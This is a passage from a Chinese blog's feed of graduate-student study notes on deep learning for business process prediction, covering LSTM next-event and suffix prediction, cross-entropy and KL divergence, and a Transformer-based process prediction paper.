class="headerlink" title="实现"></a>实现</h2><ul><li>使用的循环神经网络依赖库Keras构建项目</li><li>硬件是NVidia Tesla k80 GPU，每次epoch时间为15-90s。其中预测时间时间戳是以毫秒为单位的。</li></ul><h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><h3 id="评定标准"><a href="#评定标准" class="headerlink" title="评定标准"></a>评定标准</h3><p>本文使用的<font color="#FF8C00">MAE</font>（平均绝对误差）来作为实验结果比较的参考。在实验效果评价这块，作者通过修改 van der Aalst提出的论文中用于预测剩余时间的模型来作为baseline。</p><h3 id="实验准备-1"><a href="#实验准备-1" class="headerlink" title="实验准备"></a>实验准备</h3><p>使用两个数据集进行预测下一个活动和时间戳。其中2/3的数据用于训练模型，1/3的用于预测。</p><p><i class="fas fa-tags" ></i>这里数据中长度为2的序列进行 $2 \leq k \lt | o |$ 预测，长度小于2则不对其预测。</p><p><strong><font color="#00008B">数据集</font></strong></p><ol><li>帮助中心数据集</li></ol><p>来自于意大利软件公司的票务管理系统，主要包括9中事件，一种事务流程。其中流程总共有3804条，事件有13710个。<br>2. BPI12子数据集W</p><p>此事件日志源自Business Process Intelligence Challenge（BPI’12）2，包含来自大型金融机构金融产品应用程序的数据。此流程由三个子流程组成：一个子流程跟踪应用程序的状态，一个子流程跟踪与应用程序关联的工作项的状态，第三个子流程跟踪报价的状态。在预测未来事件及其时间戳的上下文中，我们对自动执行的事件不感兴趣。因此，我们将评估范围缩小到工作项子流程，<font color="#FF8C00">其中包含手动执行的事件</font>。此外，我们过滤日志以<strong>仅保留complete类型的事件</strong>。</p><h2 id="结果分析"><a href="#结果分析" class="headerlink" title="结果分析"></a>结果分析</h2><p><img src="http://files.shanqianche.cn/2021727/1627377231055.png" alt="result，前缀为all表示所有前缀的平均值"><br>N表示神经元。MAE为当前配置不同前缀长度的性能。</p><p>表1显示了help desk和BPI’12w子流程日志上各种LSTM体系结构在MAE预测时间和预测下一事件准确性方面的性能。由于BPI12中的流程长度较长，所以前缀较长。</p><p>TODO 前缀不是很懂<br><font color="#7FFF00">分析：</font></p><ol><li>ALL LSTM体系结构在所有前缀上都优于baseline，同时分别比较LSTM模型和baseline模型，可以发现 <strong><font color="#FF00FF">短前缀的增益要比长前缀要好。</font></strong></li><li>数据集helpdesk的预测准确度最好为71%；BPI’12 W数据集预测的最佳精度为76%，高于Breuker等人报告的71.9%的精度和Evermann等人报告的62.3%的精度。</li><li>预测精度最高的模型都为混合模型，尝试将每层的神经元数量减少到75个，对于只有一个共享层的架构，将其增加到150个，但发现这会导致两个任务的性能下降。可能有75个神经元导致模型欠拟合，而150个神经元导致模型过拟合。我们还在单层架构上对传统RNN进行了实验，发现它们在时间和活动预测方面都比LSTM差得多。</li></ol><h1 id="后缀预测"><a href="#后缀预测" class="headerlink" title="后缀预测"></a>后缀预测</h1><blockquote><p><strong><font color="#ff7500">本章理解</font></strong><br>区别于上一节，上一章是单个时间步长预测下一步，而本章是预测一个运行案例的整个延续。</p></blockquote><p><img src="http://files.shanqianche.cn/2021728/1627454393652.png" alt="事件预测"></p><p><img src="http://files.shanqianche.cn/2021728/1627454420942.png" alt="时间预测"></p><h2 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h2><p>通过迭代地预测下一个事件和时间戳，然后再次进行预测直至这个案例结束。这里用 $\perp$ 表示案例结尾。</p><p><strong><font color="#006400">迭代预测：</font></strong></p><p><img src="http://files.shanqianche.cn/2021728/1627455885003.png" alt="事件预测算法"></p><p><img src="http://files.shanqianche.cn/2021728/1627456583245.png" alt="时间预测算法"></p><p><font color="#FF1493">当当前事件为END，则不进行预测；否则将预测的结果输入到预测模块迭代预测。</font></p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>对于预测准确度的评价这里采用的是通过计算预测结果与实际结果的编辑距离来衡量。</p><blockquote><p>知识补充：<font color="#2e4e7e">Levenshtein distance</font><br><a href="https://www.cnblogs.com/ivanyb/archive/2011/11/25/2263356.html">字符串相似度算法（编辑距离算法 Levenshtein Distance） - ZYB - 博客园</a></p></blockquote><p><strong>问题：</strong><br>  当处理并发任务的时候，Levenshtein distance并不适用于计算。例如&lt;a,b&gt;为预测的下一个事件，但实际上为&lt;b,a&gt;，这种情况只是因为ab并发顺序导致的，<font color="#DC143C">实际上并无相关</font>。但是Levenshtein distance结果为2,因为将预测序列转换为实际序列需要一次删除和一次插入操作。</p><p><strong>解决</strong><br>Damerau-Levenstein距离是一种更好地反映预测质量的评估度量，它为Levenshtein距离使用的操作集添加了交换操作。Damerau-Levenshtein距离将分配1的转换成本⟨a、 b⟩ 进入⟨b、 a⟩. 为了获得可变长度记录道的可比较结果，我们通过实际案例后缀长度和预测后缀长度的最大值对Damerau-Levenshtein距离进行归一化，归一化的Damerau-Levenshtein距离减1以获得Damerau-Levenshtein相似性（DLS）。</p><p><strong>模型</strong><br>采用的是双层架构，每层100个神经元的LSTM。</p><p><strong>数据集</strong><br>这是荷兰某市政当局环境许可程序的日志每宗个案涉及一份许可证申请。<br>该日志包含937个案例和381种事件类型的38944个事件。几乎每一种情况都遵循一个独特的路径，这使得后缀预测更具挑战性。</p><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="http://files.shanqianche.cn/2021728/1627479266512.png" alt="基于Damerau-Levenshtein相似性的后缀预测结果"><br>Polato为baseline，no duplicates表示去掉案例中的重复事件，但是保留一个【案例结尾即使为重复事件也不去掉】。</p><p>观察可以发现所有数据集中的LSTM预测结果都要好于baseline。在BPI12数据集种很多案例中的事件会重复的出现，这就会导致预测的后缀长于真实案例，因此删除了BPI12中重复的事件并重新进行评估。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>利用LSTM神经网络预测运行案例的下一个活动及其时间戳的技术。表明，这种技术在现实数据集上优于现有的基线。此外，我们发现通过单一模型（多任务学习）预测下一个活动及其时间戳比使用单独的模型进行预测具有更高的准确性。</li><li>提出了一个运行种的案例整个延续的预测和预测剩余的周期时间的解决方案。</li><li>发现了LSTM模型的局限性，**<font color="#9932CC">即在一个案例种某些事件多次重复出现时，导致后缀过长，性能就会很低</font>**。</li></ol>]]></content>
      
      
      <categories>
          
          <category> paper </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> deep learning </tag>
            
            <tag> paper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>损失函数之交叉熵(一般用于分类问题)</title>
      <link href="/2021/07/18/%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0%E4%B9%8B%E4%BA%A4%E5%8F%89%E7%86%B5(%E4%B8%80%E8%88%AC%E7%94%A8%E4%BA%8E%E5%88%86%E7%B1%BB%E9%97%AE%E9%A2%98)/"/>
      <url>/2021/07/18/%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0%E4%B9%8B%E4%BA%A4%E5%8F%89%E7%86%B5(%E4%B8%80%E8%88%AC%E7%94%A8%E4%BA%8E%E5%88%86%E7%B1%BB%E9%97%AE%E9%A2%98)/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.youtube.com/watch?v=i73Lh3h0DpQ" title="ONE HOUR"><img src="https://res.cloudinary.com/marcomontalbano/image/upload/v1626618085/video_to_markdown/images/youtube--i73Lh3h0DpQ-c05b58ac6eb4c4700831b2b3070cd403.jpg" alt="ONE HOUR"></a></p><p><a href="https://blog.csdn.net/u014453898/article/details/81559462">损失函数之交叉熵(一般用于分类问题)_ZJE-CSDN博客</a></p><h2 id="信息量、信息熵、相对熵"><a href="#信息量、信息熵、相对熵" class="headerlink" title="信息量、信息熵、相对熵"></a>信息量、信息熵、相对熵</h2><h3 id="信息量"><a href="#信息量" class="headerlink" title="信息量"></a>信息量</h3><p><font color="#FF8C00">一件事发生的概率越大，其蕴含的信息量就越少，反之，若发生的几率越小，则蕴含的信息量就越大</font>。</p><p>例如，“太阳从东方升起”：这件事发生概率极大，大家都习以为常，所以不觉得有什么不妥的地方，因此蕴含信息量很小。但“国足踢入世界杯”：这就蕴含的信息量很大了，因为这件事的发生概率很小。</p><p><img src="http://files.shanqianche.cn/2021718/1626617713541.png" alt="信息量"></p><p>若某事x的发生概率为P(x)，则信息量的计算公式为：<br>$I ( x ) = - \log ( P ( x ) )$</p><p>上式的log的底为2，当然也可以是e、10。在神经网络中，log的底一般是e。当log的底大于1，log的图形就像下图红色线。因为P(x)的取值范围为0<del>1，可以看到，log的图像，在0</del>1的时候是负数，且P(x)越接近0，log越接近负无穷，P(x)越接近1，log越接近0，所以信息量的公式会在log前面加个负号，让log的取值范围为0~∞。当P(x)接近0，log接近无穷，P(x)接近1，log接近0，这符合信息量的概率越小，信息量越大的定义。</p><h3 id="信息熵"><a href="#信息熵" class="headerlink" title="信息熵"></a>信息熵</h3><p>信息熵可以表达<strong>数据的信息量大小</strong>。<br>信息熵也被称为熵，用来表示所有信息量的<strong>期望</strong>。<br>期望是试验中每次可能结果的概率乘以其结果的总和。<br>信息熵的公式如下：<br>$H ( X ) = - \sum _ { i = 1 } ^ { n } P ( x _ { i } ) \log ( P ( x _ { i } )  )$ $( X = x _ { 1 } , x _ { 2 } , x _ { 3 } , x _ { n - 1 } , x _ { n } )$</p><p>使用明天的天气概率来计算其信息熵：</p><p><img src="http://files.shanqianche.cn/2021718/1626618468307.png" alt="天气"><br>$H ( X ) = - ( 0.5 * \log ( 0.5 ) + 0.2 * \log ( 0.2 ) + 0.3 * \log ( 0.3 ) )$</p><h3 id="KL散度（相对熵）—–用于衡量两个概率分布的差异"><a href="#KL散度（相对熵）—–用于衡量两个概率分布的差异" class="headerlink" title="KL散度（相对熵）—–用于衡量两个概率分布的差异"></a>KL散度（相对熵）—–用于衡量两个概率分布的差异</h3><p><strong><font color="#8A2BE2">如何理解 “衡量两个概率分布的差异”？</font></strong></p><p>例如在机器学习中，常常用P(x)表示样本的真实分布，用Q(x)表示模型预测的分布，比如在一个三分类任务中（例如，猫狗马分类器），[x1，x2，x3]分别表示猫，狗，马的概率，输入一张猫的图片，其真实分布为P(x)=[1，0，0]，预测分布为Q(x)=[0.7，0.2，0，1]，那么P(x)和Q(x)就是两个不同的概率分布，可以用KL散度来计算他们的差异。<br>公式为：<br><img src="http://files.shanqianche.cn/2021718/1626618687852.png" alt="enter description here"><br>KL散度越小，表示P(x)和Q(x)越接近，所以可以通过反复训练，来使Q(x)逼近P(x)，但KL散度有个特点，就是不对称，就是用P来你和Q和用Q来你和P的KL散度(相对熵)是不一样的，但是P和Q的距离是不变的。</p><p><strong>那KL散度(相对熵)和交叉熵有什么联系呢</strong>？</p><p>我们通过对相对熵公式进行变形：<br><img src="http://files.shanqianche.cn/2021718/1626618747252.png" alt="enter description here"><br>H(X)为之前的信息熵，后面那一坨其实就是交叉熵了，所以可以看到：**<font color="#FF00FF">KL散度 = 交叉熵 - 信息熵</font>**</p><p>所以交叉熵的公式如下：<br><img src="http://files.shanqianche.cn/2021718/1626618800801.png" alt="enter description here"><br>从信息熵的公式，我们知道，对于同一个数据集，其信息熵是不变的，所以信息熵可以看作一个常数，因此<font color="#9400D3">当KL散度最小时，也即是当交叉熵最小时</font>。在多分类任务中，KL散度(相对熵)和交叉熵是等价的。</p><h2 id="交叉熵的原理"><a href="#交叉熵的原理" class="headerlink" title="交叉熵的原理"></a>交叉熵的原理</h2><p>交叉熵是<font color="#057748">用来衡量两个 概率分布 的距离</font>(也可以叫差别)。[概率分布：即[0.1，0.5，0.2，0.1，0.1]，每个类别的概率都在0~1，且加起来为1]。</p><p>若有两个概率分布p(x)和q(x)，通过q来表示p的交叉熵为：(<strong>注意</strong>，p和q呼唤位置后，交叉熵是不同的)<br>$H ( p , q ) = - \sum p ( x ) \log q ( x )$<br>只要把p作为正确结果(如[0，0，0，1，0，0])，把q作为预测结果(如[0.1，0.1，0.4，0.1，0.2，0.1])，就可以得到两个概率分布的交叉熵了，<strong>交叉熵值越低，表示两个概率分布越靠近</strong>。</p><p><strong>交叉熵计算实例：</strong><br>假设有一个三分类问题，某个样例的正确答案是(1，0，0)，某个模型经过softmax回归之后的预测答案是(0.5，0.4，0.1)，那么他们的交叉熵为：<br><img src="http://files.shanqianche.cn/2021718/1626619013263.png" alt="enter description here"><br>如果另一个模型的预测概率分布为(0.8，0.1，0.1)，则这个预测与真实的交叉熵为：<br><img src="http://files.shanqianche.cn/2021718/1626619026409.png" alt="enter description here"><br>由于0.1小于0.3，所以第二个预测结果要由于第一个。</p><h2 id="使用交叉熵的背景"><a href="#使用交叉熵的背景" class="headerlink" title="使用交叉熵的背景"></a>使用交叉熵的背景</h2><p>通过神经网络解决分类问题时，一般会设置k个输出点，k代表类别的个数，如下图<br><img src="http://files.shanqianche.cn/2021718/1626619104894.png" alt="enter description here"><br>每个输出结点，都会输出该结点对应类别的得分，如[cat，dog，car，pedestrian] 为[44，10，22，5]</p><p>但是输出结点输出的是得分，而不是概率分布，那么就没有办法用交叉熵来衡量预测结果和真确结果了，那怎么办呢，**<font color="#FF00FF">解决方法是在输出结果后接一层 softmax，softmax的作用就是把输出得分换算为概率分布</font>**。</p>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> algorithm </tag>
            
            <tag> process mining </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于注意力机制的神经网络业务过程预测分析</title>
      <link href="/2021/07/17/%E5%9F%BA%E4%BA%8E%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6%E7%9A%84%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%9A%E5%8A%A1%E8%BF%87%E7%A8%8B%E9%A2%84%E6%B5%8B%E5%88%86%E6%9E%90/"/>
      <url>/2021/07/17/%E5%9F%BA%E4%BA%8E%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6%E7%9A%84%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%9A%E5%8A%A1%E8%BF%87%E7%A8%8B%E9%A2%84%E6%B5%8B%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1842025914&auto=1&height=66"></iframe><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>提出了一种具有注意力机制的神经网络，它是使用公开的事件日志（如BPI Challenge 2013）进行训练。<br>同时使用n-gram模型对比结果和LSTM（长-短期记忆结构的神经网络）对比训练时间。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>提到使用以前较小的数据进行与之前的研究进行对比，同时也使用到了较大过程的日志进行评估。<br>本文的亮点，作者首次提出结合基于自我关注的transformer模型【NLP中常用】进行流程预测。</p><blockquote><p>Transformer：<br><a href="https://zhuanlan.zhihu.com/p/48508221">详解Transformer （Attention Is All You Need） - 知乎</a><br><a href="https://zhuanlan.zhihu.com/p/171875438">李宏毅-Attention，Self-Attention，Transformer - 知乎</a><br>Attention is All You Need<br><a href="https://finance.sina.com.cn/tech/2021-01-26/doc-ikftpnny1935086.shtml">堪比当年的LSTM，Transformer引燃机器学习圈：它是万能的|LSTM|机器学习_新浪科技_新浪网</a></p></blockquote><blockquote><p>残差网络<br>残差网络是为了解决深度神经网络（DNN）隐藏层过多时的网络退化问题而提出。退化（degradation）问题是指：当网络隐藏层变多时，网络的准确度达到饱和然后急剧退化，而且这个退化不是由于过拟合引起的。<br><a href="https://www.jiqizhixin.com/graph/technologies/738e788b-0e3b-4a8f-bd04-e407c7137694">深度残差网络 | 机器之心</a></p></blockquote><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ol><li><p>Attention</p></li><li><p>self-attention</p></li></ol><p><a href="https://blog.csdn.net/At_a_lost/article/details/108469516">Attention机制与Self-Attention机制的区别_At_a_lost的博客-CSDN博客_attention和self attention的区别</a></p><ol start="2"><li><p>Transformer<br>Transformer模型并没有捕捉顺序序列的能力，也就是说无论句子的结构怎么打乱，Transformer都会得到类似的结果。换句话说，Transformer只是一个功能更强大的词袋模型而已。<br>为了解决这个问题，论文中在编码词向量时引入了位置编码（Position Embedding）的特征。—自己设计编码规则</p></li><li><p>前馈神经网络也经常称为多层感知器（Multi-Layer Perceptron，MLP）</p></li></ol><h3 id="事件日志"><a href="#事件日志" class="headerlink" title="事件日志"></a>事件日志</h3><p><strong><font color="#FF8C00">简述日志结构</font></strong></p><p><img src="http://files.shanqianche.cn/2021717/1626528110183.png" alt="流程结构--UML"></p><p>一个事件日志由多个案例组成，但一个案例总是分配给一个事件日志。案件与事件的关系也是如此；事件的典型属性是<strong>活动、持续时间、优先级或成本</strong>。</p><p>事件日志与事件案例：一对多<br>事件案例与事件：一对多</p><h3 id="Attention"><a href="#Attention" class="headerlink" title="Attention"></a>Attention</h3><p><strong>这块需要提前学习Transformer</strong></p><ol><li>通常，序列中的每个位置可以关注序列中的任何其他位置。作者提到为了不让Softmax函数计算时不考虑位置特征，将当前事件之后的位置的值设置为无穷大【忽略位置特征】</li></ol><ul><li>我的理解是位置特征无法通过分类来实现，这也是Transformer无法捕获序列顺序的原因</li></ul><ol start="2"><li>这里为了梯度的稳定，Transformer使用了score归一化，即除以 $\sqrt{d_{k}}$</li></ol><blockquote><p>**<font color="#7FFF00">知识补充</font>**：softmax<br><a href="https://zhuanlan.zhihu.com/p/105722023">一文详解Softmax函数 - 知乎</a><br>多分类、求大</p></blockquote><p><img src="http://files.shanqianche.cn/2021717/1626531018697.png" alt="Attention函数"></p><p>$W _ { i } ^ { Q } , W _ { i } ^ { K } , W _ { i } ^ { V } \in R^{d_{model}*d_{k}}$ ， $W^{O}\in R^{hd_{k}*d_{model}}$ 【 $d_{model}$ 表示嵌入的长度（可以理解为词嵌入）】</p><p><img src="http://files.shanqianche.cn/2021717/1626531384298.png" alt="self-attention函数"></p><p><img src="http://files.shanqianche.cn/2021717/1626531047214.png" alt="相当于h 个不同的self-attention的集成，全连接层"></p><p>通过学习线性变换将Q向量、K向量和V向量投影到h个不同的子空间中，在每个子空间上<strong>并行</strong>计算Attention值。结果被连接并投射到特征空间，使得模型能够联合处理来自不同位置的不同表示子空间的特征。</p><h2 id="相关"><a href="#相关" class="headerlink" title="相关"></a>相关</h2><ol><li>2016年之前主要是使用MMs（生成模型）和聚类算法（KNN或k-means）相结合；剩下的就是一些类似MMs，例如，基于贝叶斯概念的概率有限自动机（概率模型），它使用期望的极大似然估计。 数据来源2012，2013公开的BPI比赛。</li><li>2016至今，几乎都是长短期记忆结构（LSTM）然后与其它模型相结合的方法来预测，比如结合词嵌入的神经网络，使用一个热编码转换事件特征，并将其与生成的时间特征连接到单个特征向量。数据来源2012，2013公开的BPI比赛</li><li>另一种方法将事件预测视为经典的多类分类问题，并使用堆叠的自动编码器提取特征，然后使用深度前馈网络对特征进行分类。然而，这种方法只适用于简单的数据集，因为不同表示的数量随着唯一事件类的数量呈多项式增长。</li></ol><blockquote><p><font color="#FF8C00">知识补充</font> 独热编码<br><a href="https://www.cnblogs.com/zongfa/p/9305657.html">数据预处理：独热编码（One-Hot Encoding）和 LabelEncoder标签编码 - 理想几岁 - 博客园</a></p></blockquote><blockquote><p><font color="#9400D3">知识补充</font> 多项式增长<br>也就是对于变量n，5n^2+2n+1这种就叫做多项式。</p></blockquote><h2 id="数据集"><a href="#数据集" class="headerlink" title="数据集"></a>数据集</h2><p><strong>本实验数据集：</strong></p><ol><li>BPI Challenge 2013</li><li>一家德国软件公司提供的额外数据集。后一个数据集的事件日志包括律师、会计师和审计员使用一种特殊软件工具进行财务核算、管理付款交易和编制年度财务报表的情况。</li></ol><p>数据集由大约2.08亿个事件组成，由会话id标识，该会话id指示它们所属的情况、事件类型和时间戳。每个用户交互（通常是点击按钮）都被视为一个事件，一个案例从应用程序启动一直持续到关闭。</p><p>难点：<br>作者通过流程挖掘，许多独特的事件类增加了预测的难度。在<strong>较小的数据集中</strong>，大多数情况下都非常短。大约四分之一的病例由五个或更少的事件组成，只有百分之一的流程长度为500或更多。<br>同时数据集中大部分数据为重复的，数据类型不均匀，最常见的五个事件类型几乎占了<strong>整个数据集</strong>的一半。</p><h2 id="建模方法"><a href="#建模方法" class="headerlink" title="建模方法"></a>建模方法</h2><p>模型是在tensorflow上实现的，使用tf.data-API作为输入管道，tf.keras-API构建我们的模型。【不懂，反正tensorflow上的组件哇】</p><h3 id="数据预处理"><a href="#数据预处理" class="headerlink" title="数据预处理"></a>数据预处理</h3><ol><li>整理事件类型，并用整数标记</li><li>将一个流程的所有事件放到一个张量（tensor，多维数组，能够创造更高维度的矩阵、向量。）</li><li>为每个流程添加一个结束标记，并且通过左移一个位置来生成训练标签【没懂为啥要左移生成标签，但是目的是为了生成训练标签，感觉是<strong>通过监控位置标签判断是否为训练数据集</strong>】</li><li>在上一部分中提到数据集长短不一，作者提出通过按照长度将流程分到不同区域中。这里为了确保每个区域中的流程相似，就没有设置固定的长度，而是通过制定上限来控制长度。</li></ol><p><img src="http://files.shanqianche.cn/2021717/1626535517054.png" alt="上限控制"></p><p>$l_{1}&lt;9$ </p><h3 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h3><p><img src="http://files.shanqianche.cn/2021717/1626535685586.png" alt="a为模型，b为attention模块"></p><p>N表示Transformer的数量、 $d_{model}$ 表示嵌入长度、h表示Attention的数量， $d_{l}$ 表示Q，K，V的向量维度。<br>M表示词汇的数量，这里可以理解为事件的数量，n为单个流程的长度，bsz表示流程的数量，单次样本数量。<br>Pos.Encoding  位置编码标记</p><blockquote><p><strong><font color="#DC143C">知识补充</font></strong><br><a href="https://blog.csdn.net/program_developer/article/details/78597738">神经网络中Epoch、Iteration、Batchsize相关理解和说明_Microstrong-CSDN博客_epoch</a><br><strong>epoch</strong>：中文翻译为时期。<br>一个时期=所有训练样本的一个正向传递和一个反向传递。<br>举个例子，训练集有1000个样本，batchsize=10，那么：<br>训练完整个样本集需要：<br>100次iteration，1次epoch。</p></blockquote><blockquote><p><strong>理解辅助：</strong><br>这块主要和Transformer论文中的Shared-Weight Embeddings and Softmax这一部分一样<br>与其他序列转导模型类似，使用可学习的 Embeddings 将 input tokens and output tokens 转换为维度  的向量【序列转序列转为d（model）维度的向量】。通过线性变换和 softmax 函数将解码器的输出向量转换为预测的 token 概率。在 Transformer 模型中，两个嵌入层和 pre-softmax 线性变换之间共享相同的权重矩阵，在 Embeddings 层中，将权重乘以 . 这些都是当前主流的操作。</p></blockquote><ol><li>通过被一个正态分布初始权值的可训练查找矩阵构成的<strong>嵌入层</strong>将输入映射到一个 $d_{model}$ 维度的特征空间【①使用embedding将输入转化为 $d_{model}$ 维度的向量】，同时pre-softmax函数在transformer中使用相同的查找矩阵。</li><li>由于Transformer不对顺序有预测效果，所以将位置编码加入到嵌入向量中【与第一个方法类似结合sin，cos】</li><li>通过交叉熵和标签滑动来进行拟合结果和消除过拟合</li><li>最后作者提到注意计算结果在内部缓存并复用的问题，主要在担心内存溢出，但是实验缓冲所需的空间可忽略不计。</li></ol><blockquote><p><strong><font color="#0000FF">知识补充</font></strong><br>label smoothing(标签平滑)：正则化策略，为了防止过拟合，加入噪声<br><a href="https://zhuanlan.zhihu.com/p/116466239">label smoothing(标签平滑)学习笔记 - 知乎</a><br>交叉熵即预测值与真实值之间的差值，越少越精准。<br><a href="https://blog.zuishuailcq.xyz/2021/07/18/%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0%E4%B9%8B%E4%BA%A4%E5%8F%89%E7%86%B5(%E4%B8%80%E8%88%AC%E7%94%A8%E4%BA%8E%E5%88%86%E7%B1%BB%E9%97%AE%E9%A2%98)/">损失函数之交叉熵(一般用于分类问题) | 吾辈之人，自当自强不息！</a></p></blockquote><blockquote><p><strong><font color="#00CED1">知识补充：</font></strong> 模型理解<br><a href="https://zhuanlan.zhihu.com/p/60821628">碎碎念：Transformer的细枝末节 - 知乎</a><br><a href="https://zhuanlan.zhihu.com/p/106867810">Transformer理论源码细节详解 - 知乎</a><br><a href="https://www.codenong.com/cs106837783/">Transformer论文详解，论文完整翻译（七） | 码农家园</a><br><a href="https://congchan.github.io/NLP-attention-03-self-attention/">Transformer &amp; Self-Attention (多头) 自注意力编码 | Fly Me to the Moon</a></p></blockquote><h2 id="结果验证"><a href="#结果验证" class="headerlink" title="结果验证"></a>结果验证</h2><p>作者使用了前面提到的BPI2013和DATSET，每个数据集分为三个部分：培训，验证和测试。对于BPI2013的数据集，作者选的的训练、验证、测试集之间比例80%，10%，10%。DATSET则是96%，2%，2%。<br>BPI2013用了30000个训练模型，DATSET使用了一百万个，一个epoch为1000个。</p><ol><li>BPI2013</li></ol><p><img src="http://files.shanqianche.cn/2021718/1626620621539.png" alt="BPI2013结果"><br>展示了四种超参数的配置 $d_{model}$ 为嵌入长度，h为Attention数量， $d_{ff}$ 规定了点式前馈神经网络的内部第一层输出节点， 为前反馈网络中的参数。</p><p>分析，在最小超参数的配置中，当结合四层Transformer后精确度达到最高。同时随着配置的增加，训练的效果却下降了，这里可能是设置超参数过大，欠拟合。</p><p><img src="http://files.shanqianche.cn/2021718/1626622123211.png" alt="近几年比较"><br>【4】”Comprehensible predictive models for business processes” 2016<br>【11】“Predicting process behaviour using deep learning”2016<br>【13】“A multi-stage deep learning approach for business process event prediction”2017</p><p>实验表明，我们的注意力竞争方法通常适用于过程事件预测的任务，并且可以与现有技术相当执行。</p><ol start="2"><li>DATSET</li></ol><p>由于DATSET的数据集较大，这里直接使用较大的超参数，同时结合4和6层的transformer</p><p><img src="http://files.shanqianche.cn/2021718/1626622668082.png" alt="超参数"></p><p><img src="http://files.shanqianche.cn/2021718/1626622687231.png" alt="DATSET"></p><pre><code>    训练的时候将超过500的流程筛选出来，这些只占了数据集1%</code></pre><p>分析，最高为0.6218。超参数较小的模型显着更糟糕，这表明它们无法完全模拟数据的复杂性。但是没有以前的数据进行对比，作者使用LSTM基本模型使用相同的超参数【256，N=4】进行对比。</p><p><img src="http://files.shanqianche.cn/2021718/1626622951569.png" alt="LSTM VS  Model"></p><p>证明了所提出的基于关注力的模型比基于LSTM的模型更好。此外，根据LSTM训练时间是我们的两倍。 <strong>TODO</strong> <font color="#FF00FF">这显示了注意机制对于长跟踪长度的优势，它能够一次处理整个跟踪，而不是一次处理一个元素。</font></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文，作者提出了基于注意力机制的业务流程预测模型，通过数据集验证，不仅在较小的数据集上（BPI2013）可以接近现有技术的精确度，同时在预测复杂的的数据集也可以达到良好的效果，同时训练时间更少。</p><p>提到对于复杂的模型处理的新的思路，<strong>对于流程轨迹进行分割，对于重复的事件进行预处理，缩短流程提升预测精度</strong>或者是<strong>仅部分学习预测</strong>。</p>]]></content>
      
      
      <categories>
          
          <category> paper </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> deep learning </tag>
            
            <tag> paper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>注意力机制</title>
      <link href="/2021/07/16/%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/"/>
      <url>/2021/07/16/%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/105335191">注意力机制到底是什么——基于常识的基本结构介绍 - 知乎</a><br><a href="https://www.zhihu.com/question/304499365">(96 封私信 / 80 条消息) 「注意力机制」是什么意思？ - 知乎</a><br><a href="https://my.oschina.net/u/876354/blog/3061863">大话注意力机制（Attention Mechanism） - 雪饼的个人空间 - OSCHINA - 中文开源技术交流社区</a><br><a href="https://zhuanlan.zhihu.com/p/148737297">attention机制中的query,key,value的概念解释 - 知乎</a></p><h2 id="注意力机制"><a href="#注意力机制" class="headerlink" title="注意力机制"></a>注意力机制</h2><p>注意力机制(Attention Mechanism)是人们在机器学习模型中嵌入的一种特殊结构，用来自动学习和计算输入数据对输出数据的<font color="#1E90FF"><strong>贡献</strong></font>大小。</p><blockquote><p>目前，注意力机制已经成为深度学习领域，尤其是自然语言处理领域，应用最广泛的“组件”之一。这两年曝光度极高的BERT、GPT、Transformer等等模型或结构，都采用了注意力机制。</p></blockquote><h2 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h2><p>来自于认知工程领域提出的，类似人对于信息采集的机制—特征工程。</p><h3 id="人身上的注意力机制"><a href="#人身上的注意力机制" class="headerlink" title="人身上的注意力机制"></a>人身上的注意力机制</h3><p>去超市购物，和朋友去购物，作为提东西的工具人，不仅要体力跟的上，那么我们还需要的是跟的上朋友的步伐，人山人海中要跟上步伐确实比较困难，当我们用眼睛去一个一个寻找，把路人的信息特征衣服，脸，发色，发型~都传入到脑海中一个一个比对寻找朋友的时候，这时候不仅效率极其低而且大脑表示也遭不住，那么我们只需要记到部分明显特征发型身高等，然后扩大视野，这样效率会明显提高。<br>像这种情形，**<font color="#9932CC">有选择的处理信号</font>**，包括人类很多生物在处理外界信号时的策略，这种处理机制就是注意力机制。</p><h3 id="特征工程——模型外部的注意力机制"><a href="#特征工程——模型外部的注意力机制" class="headerlink" 